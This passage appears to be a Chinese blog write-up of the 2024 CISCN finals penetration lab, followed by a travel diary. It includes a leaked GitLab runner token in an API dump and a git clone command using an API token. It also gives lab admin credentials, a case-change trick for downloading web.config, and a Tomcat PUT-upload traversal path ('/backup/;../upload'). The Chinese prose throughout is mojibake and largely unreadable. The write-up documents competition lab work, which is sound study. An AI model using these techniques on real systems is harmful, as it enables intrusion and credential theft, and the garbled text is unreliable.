property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-15T14:37:09.617Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR13489414oQjRCnTobkTwZpR65iS"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ‹‰ä¸‹ç¬¬ä¸€ä¸ª<code>git clone http://oauth2:&lt;API_TOKEN&gt;@192.168.8.42/vertexsoft/vertexsoftbackup.git</code>ç„¶åé‡Œé¢çš„backups.txtå°±æ˜¯æœ€åGitLabçš„flag</p><hr><h2 id="portalï¼ˆUnsolvedï¼‰"><a href="#portalï¼ˆUnsolvedï¼‰" class="headerlink" title="portalï¼ˆUnsolvedï¼‰"></a>portalï¼ˆUnsolvedï¼‰</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é¢˜æ˜¯modbus monitoré‚£ä¸ªæœåŠ¡</p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·å‘ç°éœ€è¦adminæ‰èƒ½æŸ¥çœ‹æŸäº›ä¿¡æ¯ï¼Œå°è¯•ç›´æ¥æŠ“åŒ…æ”¹ä¼ å…¥çš„å‚æ•°</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115531554.png" alt="image-20240721115531554"></p><p>User Managementä¸‹æœ‰adminçš„è¯¦ç»†ä¿¡æ¯</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115747461.png" alt="image-20240721115747461"></p><p><code>admin:A1m!n@Qsx1Jn</code></p><p>å¤´åƒå¤„æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ²¡å•¥ç”¨</p><p>User Listçš„å·¦ä¸Šè§’è¿˜æœ‰ä¸€ä¸ªExport Listçš„é€‰é¡¹å¯ä»¥ä¸‹è½½æ–‡ä»¶ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721223030799.png" alt="image-20240721223030799"></p><p>æµ‹è¯•å‘ç°web.configè¢«banäº†</p><p>èµ›åå¾—çŸ¥å¯ä»¥ç›´æ¥ç”¨<strong>å¤§å°å†™</strong>ç»•è¿‡æ¥è¯»å–..&#x2F;web.configï¼Œä»è€Œå¾—åˆ°mssqlæœåŠ¡çš„å¯†ç ï¼ˆæ³¨æ„è¦ç”¨adminè´¦å·ï¼‰</p><p>ç„¶åæ•°æ®åº“è¿ä¸Šå»ä¸€æŠŠæ¢­äº†ï¼ˆï¼Ÿ</p><hr><h2 id="WIN-PC3788ï¼ˆUnsolvedï¼‰"><a href="#WIN-PC3788ï¼ˆUnsolvedï¼‰" class="headerlink" title="WIN-PC3788ï¼ˆUnsolvedï¼‰"></a>WIN-PC3788ï¼ˆUnsolvedï¼‰</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Tomcat8.5.71ï¼ŒfuzzåŠå¤©åªæœ‰ä¸€ä¸ª&#x2F;backup&#x2F;upload</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721232402649.png" alt="image-20240721232402649"></p><p>è·¯å¾„ä¸‹åªæœ‰index.jsp</p><p>èµ›åå¾—çŸ¥å¯ä»¥PUTæ–‡ä»¶ä¸Šä¼ ï¼Œç±»ä¼¼CVE-2017-12615ï¼š<a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><p>ä½†æ˜¯uploadç›®å½•ä¸è§£æjspï¼Œç›®å½•ç©¿è¶Šåˆ°backupå³å¯<code>/backup/;../upload</code></p><hr><h2 id="DCï¼ˆUnsolvedï¼‰"><a href="#DCï¼ˆUnsolvedï¼‰" class="headerlink" title="DCï¼ˆUnsolvedï¼‰"></a>DCï¼ˆUnsolvedï¼‰</h2><p>hintï¼šIn the real world, Control of RODC Active Directory Computer Object is dangerous</p><p><del>åªè¦èƒ½æ‹¿ä¸‹è¿™2000åˆ†ï¼Œä¸€åˆ‡éƒ½ä¼šå¥½èµ·æ¥çš„</del></p><hr><h1 id="æ¸¸è®°ï¼ˆï¼Ÿ"><a href="#æ¸¸è®°ï¼ˆï¼Ÿ" class="headerlink" title="æ¸¸è®°ï¼ˆï¼Ÿ"></a>æ¸¸è®°ï¼ˆï¼Ÿ</h1><h2 id="day0"><a href="#day0" class="headerlink" title="day0"></a>day0</h2><p><del>ï¼ˆè¿™ä¸ªåº”è¯¥æ˜¯day-1ï¼‰</del>å› ä¸ºå‰ä¸€å¤©å»çš„æœºç¥¨å’Œé˜Ÿå‹ä¹°çš„ä¸æ˜¯åŒä¸€ä¸ªæ—¶é—´æ®µï¼Œå¯¼è‡´è‡ªå·±ä¸€ä¸ªäººæ‰“è½¦-ååŠ¨è½¦-åé£æœº-ååœ°é“-æ‰¾é…’åº—ï¼Œæœ€åæ™šä¸Š11ç‚¹äº†æ‰æ­‡ä¸‹æ¥ï¼Œä¸è¿‡æˆéƒ½çš„å¤œæ™¯è¿˜æŒºçƒ­é—¹çš„</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746386030.jpg" alt="1721746386030"></p><p>ï¼ˆä½ æ‹çš„ä»€ä¹ˆğŸ•8ï¼Œç³Šæˆè¿™æ ·ï¼‰ï¼ˆï¼ˆï¼ˆ</p><p>æ­£å¼å¼€å§‹day0ï¼Œå»å·å¤§æŠ¥é“</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798383.jpg" alt="1721746798383"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798391.jpg" alt="1721746798391"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798375.jpg" alt="1721746798375"></p><p>æ ¡å›­å¾ˆå¤§ï¼Œæœ‰ä¸€ç§åˆ˜å§¥å§¥è¿›å¤§è§‚å›­çš„ç¾ï¼Œæ„Ÿè§‰åƒæ˜¯å­¦å›­éƒ½å¸‚ï¼ˆä»€ </p><p>æœ€é‡è¦çš„æ˜¯è¿™é‡Œæ²¡æœ‰å‡é€Ÿå¸¦ï¼staråœ¨è£…å‡é€Ÿå¸¦è¿™æ–¹é¢é¥é¥é¢†å…ˆäº†ï¼ï¼ˆx</p><p>ç„¶åå°±æ˜¯è®¾å¤‡æµ‹è¯•</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747099417.jpg" alt="1721747099417"></p><p>ç¬‘ç‚¹è§£æï¼šä¸‹é¢é‚£ä¸ªæ‰æ˜¯æˆ‘çš„çƒ­ç‚¹</p><p>å”‰æŸšå­å¨å…±ç”¨ä¸€ä¸ªå¤§è„‘ï¼ˆ</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747257847.jpg" alt="1721747257847"></p><p>è¿˜æ˜¯æ ¡å†…çš„å¤§æ¥¼ï¼Œæ„Ÿè§‰å¥½é«˜çº§ï¼Œè¿™å°±æ˜¯985å—orz</p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747447512.jpg" alt="1721747447512"></p><p>æ˜¯ AWDP + å¯ä¿¡è®¡ç®—ctf</p><p>awdpä¸€ä¸Šæ¥å°±çœ‹ä¸Šäº†jsï¼Œå¾ˆå¿«å•Šï¼Œejs3.1.6ï¼Œrenderæ–¹æ³•ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæ¬¸è¿™ä¸å°±ç¨³äº†å—</p><p>ç„¶åç…§ç€æ•°å­—ä¸­å›½é‚£é¢˜sstiæ¥ä¿®è¿™ç©æ„ï¼Œç»™å®šå¼æ€ç»´å®³äº†ï¼Œæ²¡æ³¨æ„åˆ°renderæ–¹æ³•é‡Œé¢éœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°</p><p>ç›´åˆ°ç¬¬6è½®çš„æ—¶å€™æ‰å‡­å€Ÿå…ˆçŸ¥æ–‡åº“çš„æ‰¾åˆ°æ­£ç¡®çš„æ¼æ´ç‚¹å¹¶å®Œæˆäº†fixï¼Œç„¶åç¬¬8è½®çš„æ—¶å€™æ‰æˆåŠŸbreakï¼Œç„¶åå› ä¸ºå¿™ç€è¡¥å……wpç»†èŠ‚è¿˜å’Œä¸‰è¡€å¤±ä¹‹äº¤è‡‚äº†555</p><p>æœ€é‡è¦çš„æ˜¯æ²¡æ³¨æ„åˆ°è¿™ä¸ªawdpçš„æ¨¡å¼æ˜¯nè¡€åˆ†åˆ†æ•°è¿˜ä¼šé€’å‡ï¼Œä¼šå¯¼è‡´æˆ‘ä»¬æ¯ä¸€è½®éƒ½æ¯”åˆ«äººå°‘åŠ åˆ†</p><p>pythoné‚£é¢˜æœ¬åœ°ç¯å¢ƒèµ·ä¸æ¥è°ƒè¯•ä¸äº†ï¼Œæ„Ÿè§‰äººéƒ½éº»äº†</p><p>ç„¶åæ˜¯å»å°è¯•fix SolonMasterï¼Œä¸å¹¸åœ°ï¼Œæˆ‘è¿™é˜µå­å­¦çš„javaé‡Œé¢åˆšå¥½å”¯ç‹¬æ²¡å­¦fastjsonï¼Œçœ‹åˆ°ä¾èµ–é‡Œé¢æœ‰ä¸ªfastjsonçš„æ—¶å€™å¿ƒå‡‰äº†åŠæˆªï¼ˆ</p><p>æ²¡åŠæ³•åªèƒ½ç¡¬ç»™resolveClassåŠ é»‘ï¼Œä½†æ˜¯æˆ‘æ¥è§¦çš„javaå®åœ¨æ˜¯å¤ªå°‘äº†æœ€ç»ˆä¹Ÿæ²¡èƒ½ä¿®æˆ</p><p>æœ€åå°±é»˜é»˜åƒåˆ†åˆ°äº†day1ç»“æŸï¼Œè¿˜å¥½js breakå¾—å¿«èƒ½å¤Ÿæ‰³å›ä¸€åŸï¼Œä¸ç„¶ä¾¿æ ·è¡°äº†ã€‚ã€‚</p><p>3ç‚¹ç»“æŸå›åˆ°é…’åº—ç›´æ¥èººåºŠä¸Šç¡å¤§è§‰zzzï¼Œé˜Ÿå‹å€’æ˜¯ç›´æ¥å»ç©äº†</p><p>æ™šä¸Šä¾¿æ˜¯å‡†å¤‡ä¸€ç‚¹æ¸—é€ç›¸å…³çš„ä¸œè¥¿</p><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p><del>ä½ è¯´å¾—å¯¹ï¼Œä½†ä»Šå¤©æ˜¯0721ï¼Œä¸­é—´å¿˜äº†ï¼Œå› ä¸ºä»Šå¤©å°±æ˜¯è¿™æ ·çš„æ—¥å­å˜›.jpg</del></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240724000510733.png" alt="image-20240724000510733"></p><p>æ¸—é€ + è½¦è”ç½‘&amp;å·¥æ§</p><p>æˆ‘è‡ªç„¶æ˜¯è´Ÿè´£å‰è€…äº†</p><p>ä»€ä¹ˆï¼Œæˆ‘åšå†…ç½‘ä»£ç†ï¼ŒçœŸçš„å‡çš„ï¼Ÿ</p><p>åˆ°äº†åœºåœ°ä¹‹åå·¨é­”æ‰å‘ç°æ²¡å¸¦æ‹“å±•åäºæ˜¯åˆå›å»æ‹¿ï¼Œè€Œæˆ‘stowawayå†…ç½‘ä»£ç†æä¸æ˜ç™½å¡äº†åŠå¤©ï¼Œç„¶åerpåˆæ²¡å­¦è¿‡ï¼Œçœ‹ç€å¤§ä¼™ä¸€ä¸ªä¸ªè§£å‡ºerpçš„æ—¶å€™ç¡®å®æœ‰ç‚¹æ€¥äº†</p><p>å¥½åœ¨fscanæ‰«å‡ºæ¥çš„æ´æ˜¯heapdumpæ³„éœ²ï¼Œæ­¤äº‹åœ¨æˆ‘çš„<a href="https://c1oudfl0w0.github.io/blog/2023/10/25/0xGameCTF-Week4/#spring-%E5%A4%8D%E7%8E%B0">0xgame week4</a>ä¸­äº¦æœ‰è®°è½½ï¼Œè¿æ°”ä¹Ÿæ˜¯æŒºå¥½ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªç®€å•çš„shiroåˆ©ç”¨ä¸€æŠŠæ¢­getshellï¼Œä¹Ÿç®—æ˜¯èµ›æ£é­…åŠ›æ—¶åˆ»ï¼ˆ</p><p>ç„¶ååšä»£ç†çš„äº‹æƒ…å…¨éƒ¨äº¤ç»™å·¨é­”äº†ï¼Œå·¨é­”é‚£è¾¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆvpsæ€»æ˜¯æ‰çº¿ï¼Œæ²¡åŠæ³•åªèƒ½æ¥æˆ‘çš„ç”µè„‘ä¸Šæ“ä½œchiselä»£ç†ï¼ˆæ€ä¹ˆæœ‰äººå¼€äº†å¿«åä¸ªç»ˆç«¯ä¸€ä¸ªä¸ªä»£ç†å•Šx</p><p>åé¢æ‰æƒ³èµ·æ¥å¯ä»¥ç›´æ¥socksä»£ç†å‡ºå»ï¼Œé—®é¢˜ä¸å¤§</p><p>WIN-OPS88è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆMDUTè¿ä¸ä¸Šå»æ•°æ®åº“ï¼ŒæŠ¥jdbcçš„é”™è¯¯ï¼Œé—®é¢˜ä¸å¤§ï¼Œæˆ‘ç›´æ¥æŠŠé‡Œé¢çš„udf.txté¡·åˆ»ç‚¼åŒ–ï¼Œæ‰‹åŠ¨æ³¨å…¥ä¾¿æ˜¯ï¼ˆ</p><p>Jenkinså› ä¸ºrwctfçš„æ—¶å€™æ¥è§¦è¿‡ä¸€æ¬¡ï¼Œçœ‹åˆ°çš„æ—¶å€™è¿˜æŒºå…´å¥‹xï¼Œé˜Ÿå‹æµ‹å‡ºæ˜¯å¼±å¯†ç è¿›å…¥ï¼Œç„¶åæˆ‘è¿™é‡Œåˆ©ç”¨æœ¬åœ°çš„å…ˆçŸ¥æ–‡åº“æ‰¾åˆ°åå°groovyå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ï¼ŒæˆåŠŸæ‹¿ä¸‹</p><p>å¯æƒœåœ¨ä¸Šåˆè§£å‡ºä¸‰é¢˜ä¹‹åæˆ‘ä»¬ä¾¿æ²¡æœ‰è¾ƒå¤§è¿›å±•äº†ï¼Œæµªè´¹ä¸å°‘æ—¶é—´åœ¨portalçš„ä»»æ„æ–‡ä»¶è¯»å–ä¸Šé¢ï¼Œå¿˜äº†Windows getshellä¹‹åå¯ä»¥å°è¯•rbpè¿œç¨‹è¿æ¥å¯¼è‡´RODCæ²¡å‡ºï¼Œåé¢å¾ˆå¤šé˜Ÿéƒ½åªæ¯”æˆ‘ä»¬å¤šäº†100åˆ†ï¼Œå°±æ˜¯å·®åœ¨è¿™é‡Œ</p><p>ä¸€ç‚¹åŠçš„æ—¶å€™æˆ‘å¼€å§‹åƒåˆé¥­ï¼ŒåŒæ—¶åˆ·ç€å…ˆçŸ¥æ–‡åº“å¯»æ‰¾çªç ´å£ï¼Œåœ¨æœ€ååäº”åˆ†é’Ÿçš„æ—¶å€™çªç„¶å‘ç°gitlabå¥½åƒæ˜¯æ˜¥ç§‹äº‘å¢ƒçš„åŸé¢˜ï¼Œä½†æ˜¯Jenkinsé¶æœºå“åº”æ…¢å¦‚ä¹Œé¾Ÿï¼Œæ‹¼å°½å…¨åŠ›ä¹Ÿæ— æ³•åŠæ—¶å¤ç°ï¼Œåˆä¸€æ¬¡è¡€äºğŸ˜­</p><p>è‡³äºWIN-PC3788ï¼Œæœ‰æƒ³è¿‡æ˜¯PUTæ–‡ä»¶ä¸Šä¼ ä½†æ„Ÿè§‰ç‰ˆæœ¬å¯¹ä¸ä¸Šäºæ˜¯æ²¡å»å®è·µğŸ˜­</p><p>æœ€ç»ˆçš„æˆç»©æ˜¯å›½äºŒï¼Œä¹Ÿæ˜¯åˆ·æ–°äº†åä¼šçš„å†å²è®°å½•</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721702570194.jpg" alt="1721702570194"></p><p>è™½ç„¶è¿˜æ˜¯æœ‰ç‚¹é—æ†¾ï¼Œæ²¡èƒ½åœ¨æœ€åä¸¤å°æ—¶ç¨³ä½ä¼˜åŠ¿ï¼Œä½†æ˜¯å·²ç»è¶³å¤Ÿäº†ï¼Œæ‰€è°“çš„ True Ending 